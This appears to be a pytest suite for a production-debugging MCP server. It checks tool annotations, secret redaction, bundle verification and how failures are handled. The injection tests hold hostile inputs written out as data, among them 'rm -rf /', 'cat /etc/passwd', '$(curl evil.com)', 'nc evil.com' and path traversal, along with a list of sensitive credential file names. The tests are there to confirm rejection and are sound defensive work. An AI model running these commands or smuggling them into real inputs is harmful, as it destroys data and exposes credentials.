"""
Automated unit and security verification test suite for production-debug.
Tests:
1. Tool annotation compliance and metadata fidelity (MCP).
2. Input sanitization, boundary checks, and shell injection prevention.
3. Secret redaction, credential leak prevention, and bundle safety.
4. Failure handling, timeout resilience, and graceful error returns.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

import pytest

from mcp.server import (
    AZURE_IDENTITY_ANNOTATIONS,
    DNS_PROBE_ANNOTATIONS,
    INCIDENT_BUNDLE_ANNOTATIONS,
    NETWORK_TRACE_ANNOTATIONS,
    capture_network_trace_summary,
    capture_network_trace_summary_impl,
    check_azure_workload_identity,
    check_azure_workload_identity_impl,
    generate_incident_bundle,
    generate_incident_bundle_impl,
    run_dns_probe,
    run_dns_probe_impl,
)
from production_debug.bundle_verifier import (
    BundleVerificationError,
    compute_file_sha256,
    verify_bundle_safety,
)
from production_debug.sanitizer import (
    is_sensitive_filename,
    redact_text,
    sanitize_directory_tree,
    sanitize_environment_dict,
)


class TestMCPToolAnnotations:
    """Validate all four MCP tools have complete, non-null boolean behavioral hints."""

    def test_dns_probe_annotations(self):
        ann = DNS_PROBE_ANNOTATIONS
        assert ann["readOnlyHint"] is True
        assert ann["destructiveHint"] is False
        assert ann["idempotentHint"] is True
        assert ann["openWorldHint"] is True
        assert isinstance(ann["title"], str)

    def test_azure_identity_annotations(self):
        ann = AZURE_IDENTITY_ANNOTATIONS
        assert ann["readOnlyHint"] is True
        assert ann["destructiveHint"] is False
        assert ann["idempotentHint"] is True
        assert ann["openWorldHint"] is True

    def test_network_trace_annotations(self):
        ann = NETWORK_TRACE_ANNOTATIONS
        assert ann["readOnlyHint"] is True
        assert ann["destructiveHint"] is False
        assert ann["idempotentHint"] is False
        assert ann["openWorldHint"] is True

    def test_incident_bundle_annotations(self):
        ann = INCIDENT_BUNDLE_ANNOTATIONS
        assert ann["readOnlyHint"] is False
        assert ann["destructiveHint"] is False
        assert ann["idempotentHint"] is False
        assert ann["openWorldHint"] is False

    def test_all_tools_have_decorator_annotations(self):
        tools = [
            run_dns_probe,
            check_azure_workload_identity,
            capture_network_trace_summary,
            generate_incident_bundle,
        ]
        required_keys = {
            "readOnlyHint",
            "destructiveHint",
            "idempotentHint",
            "openWorldHint",
        }
        for tool in tools:
            annotations = getattr(tool, "_mcp_annotations", None)
            if annotations:
                assert required_keys.issubset(annotations.keys())
                for key in required_keys:
                    assert isinstance(annotations[key], bool)


class TestInputSanitizationAndInjectionSafety:
    """Test safe handling, rejection of malicious inputs, and command injection resilience."""

    @pytest.mark.parametrize(
        "malicious_domain",
        [
            "evil.com; rm -rf /",
            "evil.com && cat /etc/passwd",
            "`whoami`.com",
            "$(curl evil.com)",
            "domain|reboot",
            "test\nnewline.com",
            "a" * 260,  # exceeds RFC 1035 limits
        ],
    )
    def test_dns_probe_rejects_command_injection(self, malicious_domain: str):
        res = run_dns_probe_impl(malicious_domain)
        assert res["status"] == "error"
        assert "Invalid domain name format" in res["error"]

    def test_dns_probe_rejects_malicious_nameserver(self):
        res = run_dns_probe_impl("example.com", nameserver="1.1.1.1; touch /tmp/pwned")
        assert res["status"] == "error"
        assert "Invalid nameserver format" in res["error"]

    @pytest.mark.parametrize(
        "malicious_iface",
        [
            "eth0; reboot",
            "eth0 | nc evil.com",
            "$(id)",
            "`uname -a`",
            "interface_name_that_is_far_too_long_for_linux_kernel",
        ],
    )
    def test_network_trace_rejects_invalid_interface(self, malicious_iface: str):
        res = capture_network_trace_summary_impl(interface=malicious_iface)
        assert res["status"] == "error"
        assert "Invalid network interface format" in res["error"]

    @pytest.mark.parametrize(
        "malicious_incident_id",
        [
            "INCIDENT-001; rm -rf /",
            "../../etc/passwd",
            "$(whoami)",
            "id&calc",
        ],
    )
    def test_incident_bundle_rejects_path_traversal_and_injection(
        self, malicious_incident_id: str
    ):
        res = generate_incident_bundle_impl(incident_id=malicious_incident_id)
        assert res["status"] == "error"
        assert "Invalid incident_id format" in res["error"]


class TestSanitizationAndRedaction:
    """Verify secrets, JWTs, keys, and environment variables are stripped and cannot leak."""

    def test_redact_jwt_and_keys(self):
        sample_log = (
            "User authorized: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."
            "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c "
            "and api_key='sk-prod-99382109482148124' with password: 'SuperSecretPassword123!'"
        )
        redacted = redact_text(sample_log)
        assert "eyJhbGciOi" not in redacted
        assert "sk-prod-99382109482148124" not in redacted
        assert "SuperSecretPassword123!" not in redacted
        assert "[REDACTED:TOKEN]" in redacted or "[REDACTED:JWT_TOKEN]" in redacted
        assert "[REDACTED:API_KEY]" in redacted
        assert "[REDACTED:PASSWORD]" in redacted

    def test_redact_private_key_block(self):
        fake_private_key = (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEowIBAAKCAQEA0Y1oD/fakekeycontentfakekeycontentfakekeycontent\n"
            "-----END RSA PRIVATE KEY-----"
        )
        redacted = redact_text(fake_private_key)
        assert "MIIEowIBAAKCAQEA" not in redacted
        assert "[REDACTED:PRIVATE_KEY]" in redacted

    def test_sensitive_filenames_detection(self):
        assert is_sensitive_filename(".env") is True
        assert is_sensitive_filename(".env.production") is True
        assert is_sensitive_filename("server.pem") is True
        assert is_sensitive_filename("tls.key") is True
        assert is_sensitive_filename("id_rsa") is True
        assert is_sensitive_filename("id_ed25519") is True
        assert is_sensitive_filename("kubeconfig") is True
        assert is_sensitive_filename("app.log") is False
        assert is_sensitive_filename("report.json") is False

    def test_sanitize_environment_dict(self):
        env = {
            "PATH": "/usr/local/bin:/usr/bin",
            "AZURE_CLIENT_ID": "c4d3b6a9-83bc-4a0e",
            "AZURE_FEDERATED_TOKEN_FILE": "/var/run/secrets/token",
            "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "SERVICE_PORT": "8080",
        }
        sanitized = sanitize_environment_dict(env)
        assert sanitized["AZURE_FEDERATED_TOKEN_FILE"] == "[REDACTED]"
        assert sanitized["AWS_SECRET_ACCESS_KEY"] == "[REDACTED]"
        assert sanitized["PATH"] == "/usr/local/bin:/usr/bin"
        assert sanitized["SERVICE_PORT"] == "8080"


class TestIncidentBundleSafetyVerification:
    """Test automated bundle integrity, fingerprinting, and credential leak prevention."""

    def test_bundle_sanitizer_removes_sensitive_files(self, tmp_path: Path):
        bundle_dir = tmp_path / "test-bundle"
        bundle_dir.mkdir()
        (bundle_dir / "metadata.json").write_text(json.dumps({"bundle_name": "test"}))
        (bundle_dir / "normal.log").write_text("All services operational\n")
        (bundle_dir / ".env").write_text("DATABASE_PASSWORD=secret123\n")
        (bundle_dir / "server.pem").write_text("cert\n")
        (bundle_dir / "app.log").write_text(
            "User logged in with password='my-secret-password-123'\n"
        )

        # Run sanitizer
        audit = sanitize_directory_tree(bundle_dir)
        assert audit["removed"] == 2  # .env and server.pem removed
        assert not (bundle_dir / ".env").exists()
        assert not (bundle_dir / "server.pem").exists()

        # Check content redaction
        app_log = (bundle_dir / "app.log").read_text()
        assert "my-secret-password-123" not in app_log
        assert "[REDACTED:PASSWORD]" in app_log

        # Verify bundle passes safety verification
        report = verify_bundle_safety(bundle_dir)
        assert report["status"] == "verified"
        assert len(report["bundle_fingerprint_sha256"]) == 64

    def test_bundle_verifier_rejects_unredacted_secrets(self, tmp_path: Path):
        bundle_dir = tmp_path / "leaky-bundle"
        bundle_dir.mkdir()
        (bundle_dir / "metadata.json").write_text(json.dumps({"bundle_name": "leaky"}))
        (bundle_dir / "leak.log").write_text("api_key='sk-live-0982341908234124'\n")

        with pytest.raises(
            BundleVerificationError, match="Unredacted sensitive pattern"
        ):
            verify_bundle_safety(bundle_dir)

    def test_file_sha256_reproducibility(self, tmp_path: Path):
        test_file = tmp_path / "reproducible.txt"
        test_file.write_text("production-debug reproducible triage artifact")
        h1 = compute_file_sha256(test_file)
        h2 = compute_file_sha256(test_file)
        assert h1 == h2
        assert len(h1) == 64


class TestFailureHandlingAndTimeoutResilience:
    """Ensure graceful degradation when dependencies are missing or commands fail."""

    def test_dns_probe_missing_dig(self):
        with patch("shutil.which", return_value=None):
            res = run_dns_probe_impl("google.com")
            assert res["status"] == "error"
            assert "dig executable not found" in res["error"]

    def test_network_trace_missing_tcpdump(self):
        with patch("shutil.which", return_value=None):
            res = capture_network_trace_summary_impl("eth0")
            assert res["status"] == "error"
            assert "tcpdump not found" in res["error"]

    def test_azure_workload_identity_safe_fallback(self):
        with (
            patch.dict("os.environ", {}, clear=True),
            patch("shutil.which", return_value=None),
        ):
            res = check_azure_workload_identity_impl()
            assert res["azure_workload_identity"]["configured"] is False
            assert res["imds_probe"]["reachable"] is False
